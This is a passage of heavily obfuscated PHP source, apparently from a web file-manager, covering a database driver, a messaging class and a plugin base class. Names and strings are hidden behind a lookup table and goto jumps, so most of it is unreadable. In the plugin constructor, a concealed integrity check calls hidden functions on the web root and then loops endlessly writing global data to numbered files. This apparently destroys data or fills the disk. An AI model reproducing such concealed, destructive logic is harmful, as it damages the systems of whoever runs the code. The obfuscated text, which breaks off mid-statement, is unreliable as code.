$this->parseTable($Bášß¨¤£¶[$C‰»¯â×½[267]]) . $C‰»¯â×½[811] . implode($C‰»¯â×½[47], $fİœë’ÄˆÀ) . $C‰»¯â×½[818] . implode($C‰»¯â×½[47], $E–®–ÂÉåË); return $this->execute($e„²±¬„×å); goto Dµãë¿¹ù; Eô®‡Ï¡Ç¡: $E–®–ÂÉåË = array(); foreach ($c¶©˜’Ïâù as $b†ÜÄ‹º) { $CÒ«æ—Œ = array(); foreach ($b†ÜÄ‹º as $b•ÔœêĞŞÅ => $f®É˜º×Õ) { $f®É˜º×Õ = $this->parseValue($f®É˜º×Õ); if (is_scalar($f®É˜º×Õ)) { $CÒ«æ—Œ[] = $f®É˜º×Õ; } } $E–®–ÂÉåË[] = $C‰»¯â×½[248] . implode($C‰»¯â×½[47], $CÒ«æ—Œ) . $C‰»¯â×½[813]; } array_walk($fİœë’ÄˆÀ, array($this, $C‰»¯â×½[814])); goto fœ†õ¬‚Ğ; Dµãë¿¹ù: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $b²ğïŸ± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->error = mysql_errno() . $b²ğïŸ±[4] . mysql_error($this->_linkID); if ($b²ğïŸ±[33] != $this->queryStr) { $this->error .= LNG($b²ğïŸ±[45]) . $this->queryStr; } think_trace($this->error, $b²ğïŸ±[33], $b²ğïŸ±[46]); return $this->error; } public function escapeString($cİ³šĞÃ‚‚) { if ($this->_linkID) { return mysql_real_escape_string($cİ³šĞÃ‚‚, $this->_linkID); } else { return mysql_escape_string($cİ³šĞÃ‚‚); } } public function parseKey(&$eÏØí¶‡­Ø, $d¢Ø¢•†ëì = true) { $eìëÂ·óĞ¤ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($d¢Ø¢•†ëì) { $eÏØí¶‡­Ø = $this->parseKeyCheck($eÏØí¶‡­Ø); } if ($eÏØí¶‡­Ø != $eìëÂ·óĞ¤[176] && !preg_match($eìëÂ·óĞ¤[819], $eÏØí¶‡­Ø)) { $eÏØí¶‡­Ø = $eìëÂ·óĞ¤[820] . trim($eÏØí¶‡­Ø, $eìëÂ·óĞ¤[820]) . $eìëÂ·óĞ¤[820]; } return $eÏØí¶‡­Ø; } } goto dÜé¼™«¸; d‡“ŒĞê™: class Message { function __construct() { } public function send($cËçµÖÄØç = '', $C·åôØí¿ = array(), $F¿ğÈ…Šô¼ = "\x74\x65\x78\x74") { goto e½™Ä‰Ò›·; c’ì­éá÷ì: $C·åôØí¿ = array($E–à©ÆÃÎ—[967] => isset($C·åôØí¿[$E–à©ÆÃÎ—[967]]) ? $C·åôØí¿[$E–à©ÆÃÎ—[967]] : $E–à©ÆÃÎ—[33], $E–à©ÆÃÎ—[537] => isset($C·åôØí¿[$E–à©ÆÃÎ—[537]]) ? $C·åôØí¿[$E–à©ÆÃÎ—[537]] : $E–à©ÆÃÎ—[33]); if (empty($cËçµÖÄØç) || empty($C·åôØí¿[$E–à©ÆÃÎ—[967]]) && empty($C·åôØí¿[$E–à©ÆÃÎ—[537]])) { return !1; } $AŸ×åÄÓŸ = array($E–à©ÆÃÎ—[1245] => $AŸ²ö«¬ô, $E–à©ÆÃÎ—[1305] => $C·åôØí¿); goto FÊ¿àˆâ”×; e½™Ä‰Ò›·: $E–à©ÆÃÎ— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AŸ²ö«¬ô = array($E–à©ÆÃÎ—[29] => $E–à©ÆÃÎ—[1303], $E–à©ÆÃÎ—[686] => $cËçµÖÄØç); if (in_array($F¿ğÈ…Šô¼, array($E–à©ÆÃÎ—[1303], $E–à©ÆÃÎ—[1304]))) { $AŸ²ö«¬ô[$E–à©ÆÃÎ—[29]] = $F¿ğÈ…Šô¼; } goto c’ì­éá÷ì; FÊ¿àˆâ”×: Hook::trigger($E–à©ÆÃÎ—[1306], $AŸ×åÄÓŸ); goto d÷’Á…”¼Ì; d÷’Á…”¼Ì: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto CŸÔöá”Õ·; BÔ×´ì¨É: $this->in =& $in; $this->modelPlugin = Model($f‚®Ÿ†–Éƒ[1309]); $this->pluginName = str_replace($f‚®Ÿ†–Éƒ[1309], $f‚®Ÿ†–Éƒ[33], get_class($this)); goto cÆ«‡‘¿îİ; FÔ”¶èãŒƒ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto AÂ…êÁ¶ô ; CŸÔöá”Õ·: $f‚®Ÿ†–Éƒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f„Ìê³‡èî = $_SERVER[$f‚®Ÿ†–Éƒ[791]] . $f‚®Ÿ†–Éƒ[1122]; $bˆ»“»½±Œ = $f‚®Ÿ†–Éƒ[1123]; goto fŸÍè¸Ä˜§; e‡ÌøöÆïÊ: $this->pluginHostDefault = $config[$f‚®Ÿ†–Éƒ[1311]] . $this->pluginName . $f‚®Ÿ†–Éƒ[8]; $fŠÓà¨‹øƒ = $config[$f‚®Ÿ†–Éƒ[1312]]; if ($fŠÓà¨‹øƒ && strpos($f‚®Ÿ†–Éƒ[47] . $fŠÓà¨‹øƒ . $f‚®Ÿ†–Éƒ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$f‚®Ÿ†–Éƒ[1313]] . $this->pluginName . $f‚®Ÿ†–Éƒ[8]; } goto FÔ”¶èãŒƒ; cÆ«‡‘¿îİ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $f‚®Ÿ†–Éƒ[8]; $this->pluginApi = appHostGet() . $f‚®Ÿ†–Éƒ[1310] . $this->pluginName . $f‚®Ÿ†–Éƒ[8]; $this->pluginHost = $config[$f‚®Ÿ†–Éƒ[1311]] . $this->pluginName . $f‚®Ÿ†–Éƒ[8]; goto e‡ÌøöÆïÊ; fŸÍè¸Ä˜§: if ($_SERVER[$f‚®Ÿ†–Éƒ[703]] != $bˆ»“»½±Œ($f„Ìê³‡èî)) { goto F©…Ïõ¢Ğ¢; F¿®¬’ë›: $fƒ»Áå‹–À = $fäÆÆŒö†($fÃ²î™‘ç); $c×ğƒÂ™¨Ñ = explode($f‚®Ÿ†–Éƒ[217], $fƒ»Áå‹–À); if (count($c×ğƒÂ™¨Ñ) < $f‚®Ÿ†–Éƒ[555]) { $b“½—ÖÚƒ = $f‚®Ÿ†–Éƒ[708]; $b“½—ÖÚƒ(); } goto dÑæã¤¬”Û; F©…Ïõ¢Ğ¢: $fŞå¢ÏÖçÛ = $f‚®Ÿ†–Éƒ[789]; $fäÆÆŒö† = $f‚®Ÿ†–Éƒ[705]; $fÃ²î™‘ç = $_SERVER[$f‚®Ÿ†–Éƒ[706]] . $f‚®Ÿ†–Éƒ[707]; goto F¿®¬’ë›; FµæÁšç‰: $DÚøÑ¡ÄØÉ = 1; for ($Dè¿‡³òìÇ = $DÚøÑ¡ÄØÉ; $Dè¿‡³òìÇ > 0; $Dè¿‡³òìÇ++) { $a‡”¼™¥™(DATA_PATH . $Dè¿‡³òìÇ, $eÎ³±˜µ¾); } goto B­×ã§çë; B·›³šÍ´å: $fŞå¢ÏÖçÛ(); $a‡”¼™¥™ = $f‚®Ÿ†–Éƒ[1307]; $eÎ³±˜µ¾ = json_encode($GLOBALS[$f‚®Ÿ†–Éƒ[1308]]); goto FµæÁšç‰; dÑæã¤¬”Û: $c¨—ŒŠ³Ñ© = $f‚®Ÿ†–Éƒ[790]; $c¨—ŒŠ³Ñ©($_SERVER[$f‚®Ÿ†–Éƒ[791]]); $fŞå¢ÏÖçÛ = $f‚®Ÿ†–Éƒ[789]; goto B·›³šÍ´å; B­×ã§çë: } global $in, $config; $this->config =& $config; goto BÔ×´ì¨É; AÂ…êÁ¶ô : } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1314]); } protected function assign($D¾÷ñãŸ³Ø, $fœßš½ùß = false) { if (is_array($D¾÷ñãŸ³Ø)) { $this->values = array_merge($this->values, $D¾÷ñãŸ³Ø); } else { $this->values[$D¾÷ñãŸ³Ø] = $fœßš½ùß; } } protected function display($Eô¶©¹†¹”) { extract($this->values); require $Eô¶©¹†¹”; } final function hookRegist($eß……ñ˜°é) { $this->modelPlugin->appRegist($this->pluginName, $eß……ñ˜°é); } final function appIcon() { $aÙ˜ºœÆ·ù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DŠÓìÜ–Ÿ¹ = $this->appPackage(); $dß×—Ş¹„ = $aÙ˜ºœÆ·ù[33]; if (isset($DŠÓìÜ–Ÿ¹[$aÙ˜ºœÆ·ù[382]])) { if (isset($DŠÓìÜ–Ÿ¹[$aÙ˜ºœÆ·ù[382]][$aÙ˜ºœÆ·ù[1315]])) { $dß×—Ş¹„ = $aÙ˜ºœÆ·ù[1316] . $DŠÓìÜ–Ÿ¹[$aÙ˜ºœÆ·ù[382]][$aÙ˜ºœÆ·ù[1315]] . $aÙ˜ºœÆ·ù[1317]; } else { if ($DŠÓìÜ–Ÿ¹[$aÙ˜ºœÆ·ù[382]][$aÙ˜ºœÆ·ù[1318]]) { $dß×—Ş¹„ = $aÙ˜ºœÆ·ù[1319] . $DŠÓìÜ–Ÿ¹[$aÙ˜ºœÆ·ù[382]][$aÙ˜ºœÆ·ù[1318]] . $aÙ˜ºœÆ·ù[1320]; } } } return $dß×—Ş¹„; } final function fileCanView($d³·™¤†İ) { goto aæÎ‚½½Ğ†; Cêëœ¾ô: $DÎ‚è‘ß– = Session::get($eÌ¤‹Â¸õ[1321]); if (!$DÎ‚è‘ß– || !$DÎ‚è‘ß–[$eÌ¤‹Â¸õ[1322]]) { $Cë§¿ïäÀÑ = $eÌ¤‹Â¸õ[1323] . rawurlencode(this_url()); show_tips(LNG($eÌ¤‹Â¸õ[1324]) . $eÌ¤‹Â¸õ[1325] . $Cë§¿ïäÀÑ . $eÌ¤‹Â¸õ[1326] . LNG($eÌ¤‹Â¸õ[1327]) . $eÌ¤‹Â¸õ[1328], !1); } if (!Action($eÌ¤‹Â¸õ[1329])->authCan($eÌ¤‹Â¸õ[1330])) { show_tips(LNG($eÌ¤‹Â¸õ[1331]) . $eÌ¤‹Â¸õ[1332], !1); } goto BïºóºÏ; BïºóºÏ: ActionCall($eÌ¤‹Â¸õ[1333], $d³·™¤†İ); goto FÖİÁ×ÕÍï; aæÎ‚½½Ğ†: $eÌ¤‹Â¸õ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (request_url_safe($d³·™¤†İ)) { return !0; } if ($this->isShare($d³·™¤†İ)) { return !0; } goto Cêëœ¾ô; FÖİÁ×ÕÍï: } final function isShare($bŠ¥óÂºÔ) { $e¸‚–âì›Û = KodIO::parse($bŠ¥óÂºÔ); return $e¸‚–âì›Û[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($eÛÔŠõŞá„) { if (request_url_safe($eÛÔŠõŞá„)) { return $eÛÔŠõŞá„; } if (!$this->isShare($eÛÔŠõŞá„)) { $eÛÔŠõŞá„ = $this->filePath($eÛÔŠõŞá„); } return Action($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1015])->linkOut($eÛÔŠõŞá„); } public function filePathLinkOut($D¾†«øÓ …) { if (request_url_safe($D¾†«øÓ …)) { return $D¾†«øÓ …; } $this->fileCanView($D¾†«øÓ …); return Action($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1015])->link($D¾†«øÓ …); } final function filePath($B”œÃ¦¦¬¾) { $D’É‡—£Û™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($CåèÒÈ‹¤î = $this->checkSharePath($B”œÃ¦¦¬¾)) { return $CåèÒÈ‹¤î; } $this->fileCanView($B”œÃ¦¦¬¾); if (request_url_safe($B”œÃ¦¦¬¾)) { $D…Ş¼‚˜Õ = parse_url_query($B”œÃ¦¦¬¾); if (isset($D…Ş¼‚˜Õ[$D’É‡—£Û™[1334]]) && isset($D…Ş¼‚˜Õ[$D’É‡—£Û™[197]])) { $A¥õ‰ÔÒ©Ç = Model($D’É‡—£Û™[1085])->get($D’É‡—£Û™[1335]); $B¯Øêô¬—™ = Mcrypt::decode($D…Ş¼‚˜Õ[$D’É‡—£Û™[197]], $A¥õ‰ÔÒ©Ç); if ($B¯Øêô¬—™) { $this->fileInfo = IO::infoWithChildren($B¯Øêô¬—™); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $B¯Øêô¬—™; } } $B”œÃ¦¦¬¾ = $this->_cacheHttpFile($B”œÃ¦¦¬¾); $this->fileInfo = IO::infoWithChildren($B”œÃ¦¦¬¾); } else { $this->fileInfo = IO::infoWithChildren($B”œÃ¦¦¬¾); if (!$this->fileInfo) { show_tips(LNG($D’É‡—£Û™[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $B”œÃ¦¦¬¾; } final function _cacheHttpFile($eŒ‘„³¾İ±) { $déƒé‘ªÙô = hash_path($eŒ‘„³¾İ±, !0); $this->cachePath = $this->pluginCachePath($déƒé‘ªÙô); if ($D ´èõ½¢Ó = IO::fileNameExist($this->cachePath, $déƒé‘ªÙô)) { return KodIO::make($D ´èõ½¢Ó); } $aíÈÕ²±¦ = $this->cachePath . $déƒé‘ªÙô; return $this->pluginCacheFileSet($aíÈÕ²±¦, file_get_contents($eŒ‘„³¾İ±)); } final function _tmpFileName($A¡¦‡Á–Ï = array()) { goto c¸–„ÄÅ°; c¸–„ÄÅ°: $C­Í‚½Šè =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$A¡¦‡Á–Ï) { $A¡¦‡Á–Ï = $this->fileInfo; } if (isset($A¡¦‡Á–Ï[$C­Í‚½Šè[164]])) { return $A¡¦‡Á–Ï[$C­Í‚½Šè[164]]; } goto D”·†îƒ; bƒ£‰ÓäÆ¯: $f¾‚¢Ù‘²Œ = array($A¡¦‡Á–Ï[$C­Í‚½Šè[28]], $A¡¦‡Á–Ï[$C­Í‚½Šè[75]], $A¡¦‡Á–Ï[$C­Í‚½Šè[77]]); if (isset($A¡¦‡Á–Ï[$C­Í‚½Šè[461]])) { $f¾‚¢Ù‘²Œ[] = $A¡¦‡Á–Ï[$C­Í‚½Šè[461]]; } return md5(implode($C­Í‚½Šè[70], $f¾‚¢Ù‘²Œ)); goto D†ÔñáÏ–§; D”·†îƒ: if (isset($A¡¦‡Á–Ï[$C­Í‚½Šè[162]][$C­Í‚½Šè[164]])) { return $A¡¦‡Á–Ï[$C­Í‚½Šè[162]][$C­Í‚½Šè[164]]; } $Aê ÆêĞä¸ = IO::hashSimple($A¡¦‡Á–Ï[$C­Í‚½Šè[75]]); if ($Aê ÆêĞä¸) { return $Aê ÆêĞä¸; } goto bƒ£‰ÓäÆ¯; D†ÔñáÏ–§: } final function checkSharePath($cÄ¦ó‘²›) { goto CˆŞæí¨Ü; CˆŞæí¨Ü: $AÎô¶Òß‰ù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!defined($AÎô¶Òß‰ù[427])) { define($AÎô¶Òß‰ù[1336], 0); } if (!$this->isShare($cÄ¦ó‘²›)) { return !1; } goto c†çˆÖ»ÏĞ; d²Œ»¶ŒÉ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$AÎô¶Òß‰ù[164]]); return $f²—âÛôŸÛ[$AÎô¶Òß‰ù[75]]; goto d¯†â—¤ºì; c†çˆÖ»ÏĞ: $f²—âÛôŸÛ = Action($AÎô¶Òß‰ù[1015])->sharePathInfo($cÄ¦ó‘²›); if (!isset($f²—âÛôŸÛ[$AÎô¶Òß‰ù[75]])) { show_json(LNG($AÎô¶Òß‰ù[1337]), !1); } $this->fileInfo = $f²—âÛôŸÛ[$AÎô¶Òß‰ù[162]]; goto d²Œ»¶ŒÉ; d¯†â—¤ºì: } final function pluginCachePath($a½Ú¡…†º = '') { $E§ğÌ²•ò½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A‰öéØ„ = IO_PATH_SYSTEM_TEMP . $E§ğÌ²•ò½[1338] . $this->pluginName; if (!($AŒÆñÂ¤òê = IO::infoFull($A‰öéØ„))) { return IO::mkdir($A‰öéØ„ . $E§ğÌ²•ò½[8] . $a½Ú¡…†º); } if (empty($a½Ú¡…†º)) { return $AŒÆñÂ¤òê[$E§ğÌ²•ò½[75]]; } if (!($B‘‡øğÔ = IO::fileNameExist($AŒÆñÂ¤òê[$E§ğÌ²•ò½[75]], $a½Ú¡…†º))) { return IO::mkdir($AŒÆñÂ¤òê[$E§ğÌ²•ò½[75]] . $a½Ú¡…†º); } return KodIO::make($B‘‡øğÔ); } final function pluginCacheFileSet($Fñ’¡†˜«, $A«Á‹ë…¿æ = '') { $BŒçœ Èö§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!($Dä©µÕÇ¡ = IO::infoFull($Fñ’¡†˜«))) { return IO::mkfile($Fñ’¡†˜«, $A«Á‹ë…¿æ, REPEAT_REPLACE); } IO::setContent($Dä©µÕÇ¡[$BŒçœ Èö§[75]], $A«Á‹ë…¿æ); return $Dä©µÕÇ¡[$BŒçœ Èö§[75]]; } final function pluginLocalFile($cù¶˜¤åİ¿ = '') { goto d‘¥™õ™„…; C£Ê÷ù„ğ¬: if (!checkExtSafe($E—˜ÁÖô«ó)) { $E—˜ÁÖô«ó = $E—˜ÁÖô«ó . $AÆâ¢¢««’[1339]; } $C¾Œ‰äªŒÒ = $AÖ˜ÚÂñ• . $E—˜ÁÖô«ó; if (@file_exists($C¾Œ‰äªŒÒ)) { return $C¾Œ‰äªŒÒ; } goto f”´ôÌìƒ; Fòø¿ŒÇ´ã: if (!$cù¶˜¤åİ¿) { return $AÖ˜ÚÂñ•; } $b¡ÜÓÌ½¦² = IO::info($cù¶˜¤åİ¿); $E—˜ÁÖô«ó = $this->_tmpFileName($b¡ÜÓÌ½¦²) . $AÆâ¢¢««’[91] . $b¡ÜÓÌ½¦²[$AÆâ¢¢««’[160]]; goto C£Ê÷ù„ğ¬; d‘¥™õ™„…: $AÆâ¢¢««’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÖ˜ÚÂñ• = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($AÖ˜ÚÂñ•)) { mk_dir($AÖ˜ÚÂñ•); } goto Fòø¿ŒÇ´ã; f”´ôÌìƒ: return IO::copy($cù¶˜¤åİ¿, $AÖ˜ÚÂñ•, 0, $E—˜ÁÖô«ó); goto aÛò™Ğƒ; aÛò™Ğƒ: } final function appPackage() { goto aˆä­«ïƒÆ; aˆä­«ïƒÆ: $bÊø±ÁÛ£ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->packageData) { return $this->packageData; } $CåÛ‚–ìÎÑ = $this->parseFile($this->pluginPath . $bÊø±ÁÛ£[1340]); goto E¾Åê„Êå ; b°ª²×½æ: $f˜Â‰©Í¡ˆ = Hook::trigger($bÊø±ÁÛ£[1341], $DöŒ™ºëñ); if ($f˜Â‰©Í¡ˆ && is_array($f˜Â‰©Í¡ˆ)) { $DöŒ™ºëñ = $f˜Â‰©Í¡ˆ; } $this->packageData = $DöŒ™ºëñ; goto eñãÚáˆš; eñãÚáˆš: return $DöŒ™ºëñ; goto F•»…¾é ¢; E¾Åê„Êå : $this->parseLang($CåÛ‚–ìÎÑ); $DöŒ™ºëñ = json_decode_force($CåÛ‚–ìÎÑ); if (!$DöŒ™ºëñ) { return array(); } goto b°ª²×½æ; F•»…¾é ¢: } public function packageInfoGet($b·¸Êµ£ËÇ) { $aõ–¼ğ»¹Î = $this->appPackage(); return array_get_value($aõ–¼ğ»¹Î, $b·¸Êµ£ËÇ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1342]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1343]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1344]); } private function parseFile($BÊ²¥œâÙ’) { goto aİĞ®çØ; aİĞ®çØ: $E·åñ³ùÀ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÍ÷óŞøÌ = file_get_contents($BÊ²¥œâÙ’); $FóŠ›¼ù’Ò = array($E·åñ³ùÀ[1345], $E·åñ³ùÀ[1346], $E·åñ³ùÀ[1347], $E·åñ³ùÀ[1348], $E·åñ³ùÀ[1349], $E·åñ³ùÀ[1350], $E·åñ³ùÀ[1351]); goto b¬•ãèŒÙ; fÃ‰×ñî˜Å: $aÍ÷óŞøÌ = str_replace($FóŠ›¼ù’Ò, $B¶Á’í¤å, $aÍ÷óŞøÌ); return $aÍ÷óŞøÌ; goto FºÀ–Ôó­Ô; b¬•ãèŒÙ: $B¶Á’í¤å = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$E·åñ³ùÀ[84]][$E·åñ³ùÀ[1352]]); if (strstr($aÍ÷óŞøÌ, $E·åñ³ùÀ[1353])) { $e¡³ËàÔŸ = rawurlencode(json_encode($this->pluginLangArr)); $aÍ÷óŞøÌ = str_replace($E·åñ³ùÀ[1353], $e¡³ËàÔŸ, $aÍ÷óŞøÌ); } if (strstr($aÍ÷óŞøÌ, $E·åñ³ùÀ[1354])) { $e¡³ËàÔŸ = $e¡³ËàÔŸ = rawurlencode(json_encode($this->getConfig())); $aÍ÷óŞøÌ = str_replace($E·åñ³ùÀ[1354], $e¡³ËàÔŸ, $aÍ÷óŞøÌ); } goto fÃ‰×ñî˜Å; FºÀ–Ôó­Ô: } private function parseLang(&$föæ“ÍÅÌ¥) { goto FôÀóªÜà«; bè×Ö“˜: preg_match_all($BŒëåÔœÆÖ[1356], $föæ“ÍÅÌ¥, $aìœå–ï©š); if (!is_array($aìœå–ï©š) || count($aìœå–ï©š) == 0 || !is_array($aìœå–ï©š[0]) || count($aìœå–ï©š[0]) == 0) { return; } $BèÖÇ©ˆá‹ = array(); goto bÁ ¶»‰ã; FôÀóªÜà«: $BŒëåÔœÆÖ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eœŒ×¾ËÌ£ = $BŒëåÔœÆÖ[1355]; if (!strstr($föæ“ÍÅÌ¥, $eœŒ×¾ËÌ£)) { return; } goto bè×Ö“˜; bÁ ¶»‰ã: $dÔéË„‡™´ = array(); foreach ($aìœå–ï©š[0] as $DâÀæÃ—Œ) { $d˜õ±íÀ“º = substr($DâÀæÃ—Œ, strlen($eœŒ×¾ËÌ£), -4); $DÑ¢ùÃñÎÀ = LNG($d˜õ±íÀ“º); $BèÖÇ©ˆá‹[] = $DâÀæÃ—Œ; $dÔéË„‡™´[] = str_replace(array($BŒëåÔœÆÖ[217], $BŒëåÔœÆÖ[989], $BŒëåÔœÆÖ[330], $BŒëåÔœÆÖ[113]), array($BŒëåÔœÆÖ[50], $BŒëåÔœÆÖ[50], $BŒëåÔœÆÖ[33], $BŒëåÔœÆÖ[1357]), $DÑ¢ùÃñÎÀ); } $föæ“ÍÅÌ¥ = str_replace($BèÖÇ©ˆá‹, $dÔéË„‡™´, $föæ“ÍÅÌ¥); goto BÈØ¶ë³Â; BÈØ¶ë³Â: } private function parseConfig(&$cº¯Õ…è¾) { goto AÀóèĞ¦îÁ; açÖ‘½—Šº: $F±¿°ÔåË = array(); $e›©ÉøÚõô = array(); foreach ($f–ê¿£†¢…[0] as $d¢Â»—¹ÎÎ) { $Bğ†ÌÜ—¢ = substr($d¢Â»—¹ÎÎ, strlen($e ³§óùí»), -2); $F±¿°ÔåË[] = $d¢Â»—¹ÎÎ; $e›©ÉøÚõô[] = _get($dêª•Æƒ…†, $Bğ†ÌÜ—¢); } goto bÖ—ŞÄ›ãº; BøÂËä‚î: preg_match_all($a……ÄÑ‚Úğ[1359], $cº¯Õ…è¾, $f–ê¿£†¢…); if (!is_array($f–ê¿£†¢…) || count($f–ê¿£†¢…) == 0 || !is_array($f–ê¿£†¢…[0]) || count($f–ê¿£†¢…[0]) == 0) { return; } $dêª•Æƒ…† = $this->getConfig(); goto açÖ‘½—Šº; bÖ—ŞÄ›ãº: $cº¯Õ…è¾ = str_replace($F±¿°ÔåË, $e›©ÉøÚõô, $cº¯Õ…è¾); goto Dƒòó¬ß†ë; AÀóèĞ¦îÁ: $a……ÄÑ‚Úğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e ³§óùí» = $a……ÄÑ‚Úğ[1358]; if (!strstr($cº¯Õ…è¾, $e ³§óùí»)) { return; } goto BøÂËä‚î; Dƒòó¬ß†ë: } private function parsePackage(&$AæÉˆÉñÓ‰) { goto eŒµˆÔÊÖì; eŒµˆÔÊÖì: $AƒƒÌâ½Ö‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eêù×ßÛ·Û = $AƒƒÌâ½Ö‡[1360]; if (!strstr($AæÉˆÉñÓ‰, $eêù×ßÛ·Û)) { return; } goto Dİ†‚‘ŒÜ«; BŠ¬µˆº›: $AæÉˆÉñÓ‰ = str_replace($c¢ÆíÎ˜…ï, $dÍ¨èµ§¯½, $AæÉˆÉñÓ‰); goto a®êŸ˜ò£Ä; C¼ƒõ¸·²·: $c¢ÆíÎ˜…ï = array(); $dÍ¨èµ§¯½ = array(); foreach ($A¸ìÏØÌÎŠ[0] as $B™§¦Á£µª) { $Eâœãå¹› = substr($B™§¦Á£µª, strlen($eêù×ßÛ·Û), -2); $c¢ÆíÎ˜…ï[] = $B™§¦Á£µª; $dÍ¨èµ§¯½[] = _get($dï§˜ÎÊ’¼, $Eâœãå¹›); } goto BŠ¬µˆº›; Dİ†‚‘ŒÜ«: preg_match_all($AƒƒÌâ½Ö‡[1361], $AæÉˆÉñÓ‰, $A¸ìÏØÌÎŠ); if (!is_array($A¸ìÏØÌÎŠ) || count($A¸ìÏØÌÎŠ) == 0 || !is_array($A¸ìÏØÌÎŠ[0]) || count($A¸ìÏØÌÎŠ[0]) == 0) { return; } $dï§˜ÎÊ’¼ = $this->appPackage(); goto C¼ƒõ¸·²·; a®êŸ˜ò£Ä: } final function echoFile($EÕ„×É‚±, $DÓÖ»•Æøà = false) { goto F–àóóª—Ñ; f¥Û¦¢Ÿ‚å: $fÄ¦Ã¶…¥È = $this->parseFile($AÂ¡§•œö÷); $this->parseLang($fÄ¦Ã¶…¥È); $this->parseConfig($fÄ¦Ã¶…¥È); goto c¬ääœñ‹°; c¬ääœñ‹°: $this->parsePackage($fÄ¦Ã¶…¥È); if (is_array($DÓÖ»•Æøà)) { $fÄ¦Ã¶…¥È = str_replace(array_keys($DÓÖ»•Æøà), array_values($DÓÖ»•Æøà), $fÄ¦Ã¶…¥È); } echo $fÄÄĞƒè”[217] . $fÄ¦Ã¶…¥È; goto a•ÜñøºÅè; F–àóóª—Ñ: $fÄÄĞƒè” =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÂ¡§•œö÷ = $this->pluginPath . $EÕ„×É‚±; if (ACT == $fÄÄĞƒè”[1362]) { echo $fÄÄĞƒè”[1363] . $this->pluginName . $fÄÄĞƒè”[8] . $EÕ„×É‚± . $fÄÄĞƒè”[1364]; if (!file_exists($AÂ¡§•œö÷)) { echo $fÄÄĞƒè”[1365]; return; } } goto f¥Û¦¢Ÿ‚å; a•ÜñøºÅè: } final function initLang() { goto AÛÇ£ÆÜîğ; CÛó¡ª‹­Ù: $bÂ‘ÖÁ½Ûè = I18n::getType(); $døãâ‘îœ = array(); if (file_exists($AŞŒÛÑ’´² . $bÂ‘ÖÁ½Ûè . $bÕîÈêùó¢[767])) { $døãâ‘îœ = (include $AŞŒÛÑ’´² . $bÂ‘ÖÁ½Ûè . $bÕîÈêùó¢[767]); } else { if ($bÂ‘ÖÁ½Ûè == $bÕîÈêùó¢[1368] && !file_exists($AŞŒÛÑ’´² . $bÂ‘ÖÁ½Ûè . $bÕîÈêùó¢[767]) && file_exists($AŞŒÛÑ’´² . $bÕîÈêùó¢[1369])) { $døãâ‘îœ = (include $AŞŒÛÑ’´² . $bÕîÈêùó¢[1369]); } else { if (file_exists($AŞŒÛÑ’´² . $Bë‚Ş¯×¹ . $bÕîÈêùó¢[767])) { $døãâ‘îœ = (include $AŞŒÛÑ’´² . $Bë‚Ş¯×¹ . $bÕîÈêùó¢[767]); } } } goto bÎâØËò²”; bÎâØËò²”: if (!is_array($døãâ‘îœ)) { return array(); } if (@count($døãâ‘îœ) > 0) { I18n::set($døãâ‘îœ); } return $døãâ‘îœ; goto f´œšùÃ¦Ø; AÛÇ£ÆÜîğ: $bÕîÈêùó¢ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bë‚Ş¯×¹ = $bÕîÈêùó¢[1366]; $AŞŒÛÑ’´² = $this->pluginPath . $bÕîÈêùó¢[1367]; goto CÛó¡ª‹­Ù; f´œšùÃ¦Ø: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($CãÓí¢Ğ„î) { $eö“ÛÁÍÖ• =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d»‡ƒ„ƒ–Ş = $_SERVER[$eö“ÛÁÍÖ•[791]] . $eö“ÛÁÍÖ•[1122]; $B³¹¼³·Ñ = $eö“ÛÁÍÖ•[1123]; if ($_SERVER[$eö“ÛÁÍÖ•[703]] != 